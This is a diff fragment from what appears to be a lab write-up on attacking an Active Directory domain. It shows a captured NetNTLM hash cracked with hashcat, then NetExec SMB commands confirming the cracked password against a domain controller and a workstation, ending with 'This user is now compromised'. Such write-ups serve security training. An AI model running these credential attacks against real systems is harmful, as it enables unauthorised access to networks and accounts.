@@ -252,6 +252,16 @@ B.WILLIAMS::ORION:3040b290a0bf746d:0da688fcf329126b8cc0782abb0a0762:010100000000
 The hash cracked in hashcat
 
 ```python
+❯❯❯ nxc smb dc01.orion.local -u 'b.williams' -p 'williams123' --smb-timeout 5 
+SMB         10.0.0.5        445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:orion.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.0.5        445    DC01             [+] orion.local\b.williams:williams123 
 
+❯❯❯ nxc smb ws-it.orion.local -u 'b.williams' -p 'williams123' --smb-timeout 5
+SMB         10.0.0.6        445    WS-IT            [*] Windows 11 / Server 2025 Build 26100 x64 (name:WS-IT) (domain:orion.local) (signing:True) (SMBv1:None)
+SMB         10.0.0.6        445    WS-IT            [+] orion.local\b.williams:williams123 
 ```
+
+This user is now compromised
+
+
 
